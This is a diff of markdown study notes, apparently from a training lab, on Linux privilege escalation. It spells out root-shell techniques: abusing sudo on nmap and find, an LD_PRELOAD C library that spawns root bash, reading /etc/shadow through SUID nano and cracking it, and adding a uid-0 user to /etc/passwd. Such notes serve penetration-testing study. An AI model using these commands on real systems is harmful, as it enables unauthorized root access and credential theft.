@@ -237,34 +237,33 @@ uid=0(root) gid=0(root) groups=0(root),1001(karen)
 ```
 
 ## Privilege Escalation: Sudo
-The sudo command, by default, allows you to run a program with root privileges.
-Under some conditions, system administrators may need to give regular users some flexibility on their privileges. 
-For example, a junior SOC analyst may need to use Nmap regularly but would not be cleared for full root access. 
-In this situation, the system administrator can allow this user to only run Nmap with root privileges while keeping its regular privilege level throughout the rest of the system.
-Any user can check its current situation related to root privileges using the sudo -l command.
-https://gtfobins.github.io/ is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.
-E.g. user has sudo rights on nmap command
-The interactive mode, available on versions 2.02 to 5.21, can be used to spawn a root shell: sudo nmap --interactive
-E.g. user has sudo rights on find command:
-find . -exec /bin/sh \; -quit may be able to break out from restricted environments by spawning an interactive system shell
+* Under some conditions system administrators may need to give regular users some flexibility on their privileges.
+* Check current root privileges using `sudo -l` command.
+* [GTFOBins](https://gtfobins.github.io/) provides information on how a user with sudo rights on a program can abuse it.
+  * E.g. user has sudo rights on `nmap` command.
+    * Interactive mode available on versions 2.02 to 5.21 can be used to spawn a root shell.
+    * `sudo nmap --interactive`.
+  * E.g. user has sudo rights on `find` command.
+    * `find . -exec /bin/sh \; -quit` may be able to break out from restricted environments by spawning an interactive system shell.
 
-Leverage application functions
-Some applications will not have a known exploit within this context. 
-Such an application you may see is the Apache2 server.
-In this case, we can use a "hack" to leak information leveraging a function of the application. 
-As you can see below, Apache2 has an option that supports loading alternative configuration files (-f : specify an alternate ServerConfigFile).
-Loading the /etc/shadow file using this option will result in an error message that includes the first line of the /etc/shadow file.
-Leverage LD_PRELOAD
-On some systems, you may see the LD_PRELOAD environment option.
-LD_PRELOAD is a function that allows any program to use shared libraries. 
-This blog post will give you an idea about the capabilities of LD_PRELOAD. 
-If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. 
-Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.
-The steps of this privilege escalation vector can be summarised as follows:
-Check for LD_PRELOAD (with the env_keep option)
-Write a simple C code compiled as a share object (.so extension) file
-Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
-The C code will simply spawn a root shell and can be written as follows:
+## Leverage application functions
+* Some applications will not have a known exploit.
+* E.g. Apache2 server.
+  * Can use a 'hack' to leak information leveraging a function of the application.
+  * Apache2 has an option that supports loading alternative configuration files.
+  * `-f : specify an alternate ServerConfigFile`.
+  * Loading the `/etc/shadow` file using `-f` option will result in an error message that includes the first line of the `/etc/shadow` file.
+
+## Leverage LD_PRELOAD
+* LD_PRELOAD environment option is a function that allows any program to use shared libraries.
+* This [blog post](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) describes the capabilities of LD_PRELOAD.
+* A shared library can be generated that will be loaded and executed before the program is run if the `env_keep` option is enabled.
+* LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.
+* Privilege escalation vector.
+  * Check for LD_PRELOAD (with the env_keep option).
+  * Write a simple C code compiled as a share object (.so extension) file.
+    * C code will simply spawn a root shell and can be written as follows:
+```
 #include <stdio.h>
 #include <sys/types.h>
 #include <stdlib.h>
@@ -274,40 +273,57 @@ setgid(0);
 setuid(0);
 system("/bin/bash");
 }
-We can save this code as shell.c and compile it using gcc (GNU Compiler Collection) into a shared object file using the following parameters:
+```
+    * Save code as `shell.c`.
+    * Compile it using gcc (GNU Compiler Collection) into a shared object file.
+```
 gcc -fPIC -shared -o shell.so shell.c -nostartfiles
-We can now use this shared object file when launching any program our user can run with sudo. 
-In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.
-We need to run the program by specifying the LD_PRELOAD option, as follows;
+```
+  * Run the program with sudo rights and the LD_PRELOAD option pointing to the .so file.
+    * `Apache2`, `find`, or almost any of the programs that can be run with sudo can be used.
+```
 sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
-This will result in a shell spawn with root privileges.
+```
+* This will result in a shell spawn with root privileges.
 
-Privilege Escalation: SUID
-Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. 
-Files can have read, write, and execute permissions. 
-These are given to users within their privilege levels. 
-This changes with SUID (Set-user Identification) and SGID (Set-group Identification).
-These allow files to be executed with the permission level of the file owner or the group owner, respectively.
-You will notice these files have an “s” bit set showing their special permission level.
-find / -type f -perm -04000 -ls 2>/dev/null will list files that have SUID or SGID bits set.
-A good practice would be to compare executables on this list with GTFOBins (https://gtfobins.github.io). 
-Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set (you can also use this link for a pre-filtered list https://gtfobins.github.io/#+suid).
-The list above shows that nano has the SUID bit set. 
-Unfortunately, GTFObins does not provide us with an easy win. 
-Typical to real-life privilege escalation scenarios, we will need to find intermediate steps that will help us leverage whatever minuscule finding we have.
-The SUID bit set for the nano text editor allows us to create, edit and read files using the file owner’s privilege. 
-Nano is owned by root, which probably means that we can read and edit files at a higher privilege level than our current user has. 
-At this stage, we have two basic options for privilege escalation: reading the /etc/shadow file or adding our user to /etc/passwd.
-Reading the /etc/shadow file
-We see that the nano text editor has the SUID bit set by running the find / -type f -perm -04000 -ls 2>/dev/null command.
-nano /etc/shadow will print the contents of the /etc/shadow file. 
-We can now use the unshadow tool to create a file crackable by John the Ripper. 
-To achieve this, unshadow needs both the /etc/shadow and /etc/passwd files.
-The unshadow tool’s usage: unshadow passwd.txt shadow.txt > passwords.txt
-With the correct wordlist and a little luck, John the Ripper can return one or several passwords in cleartext.
-The other option would be to add a new user that has root privileges. 
-This would help us circumvent the tedious process of password cracking. 
-We will need the hash value of the password we want the new user to have. 
-This can be done quickly using the openssl tool on Kali Linux.
-We will then add this password with a username to the /etc/passwd file.
-Once our user is added (please note how root:/bin/bash was used to provide a root shell) we will need to switch to this user and hopefully should have root privileges. 
+## Privilege Escalation: SUID
+* Much of Linux privilege controls relies on controlling permissions.
+  * Files can have read, write, and execute permissions.
+    * These are given to users within their privilege levels.
+    * This changes with SUID (Set-user Identification) and SGID (Set-group Identification).
+      * These allow files to be executed with the permission level of the file owner or the group owner.
+      * Files have an `s` bit set showing their special permission level.
+* `find / -type f -perm -04000 -ls 2>/dev/null` lists files that have SUID or SGID bits set.
+  * Good practice would be to compare executables on this list with [GTFOBins](https://gtfobins.github.io).
+  * Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set.
+  * Use [this link](https://gtfobins.github.io/#+suid) for a pre-filtered list.
+    * List shows that `nano` has the SUID bit set but no easy wins.
+      * `Nano` SUID bit set allows creation, editing and reading of files using the file owner’s privilege.
+      * `Nano` is owned by root.
+         * Reading and editing of files at a higher privilege level than the current user is possible.
+         * Two basic options for privilege escalation.
+           * Reading the `/etc/shadow` file.
+           * Adding the user to `/etc/passwd`.
+
+## Reading the /etc/shadow file
+* `Nano` text editor has SUID bit set by running `find / -type f -perm -04000 -ls 2>/dev/null`.
+* `nano /etc/shadow` prints the contents of the `/etc/shadow` file.
+* Use the `unshadow` tool to create a file crackable by John the Ripper.
+* `unshadow` needs both the `/etc/shadow` and `/etc/passwd` files.
+```
+unshadow passwd.txt shadow.txt > passwords.txt
+```
+* John the Ripper can return one or several passwords in cleartext with the correct wordlist and a little luck.
+* Another option would be to add a new user that has root privileges.
+  * This would help circumvent the tedious process of password cracking.
+  * Need the hash value of the password the new user should have.
+    * This can be done quickly using `openssl`.
+```
+openssl passwd -l -salt THM password1
+$1$THM$WnbwlliCqxFRQepUTCkUT1
+```
+* Add the password with a username to the `/etc/passwd` file.
+```
+hacker:$1$THM$WnbwlliCqxFRQepUTCkUT1:0:0:root:/root:/bin/bash
+``` 
+* Switch to the new user and hopefully gain root privileges. 
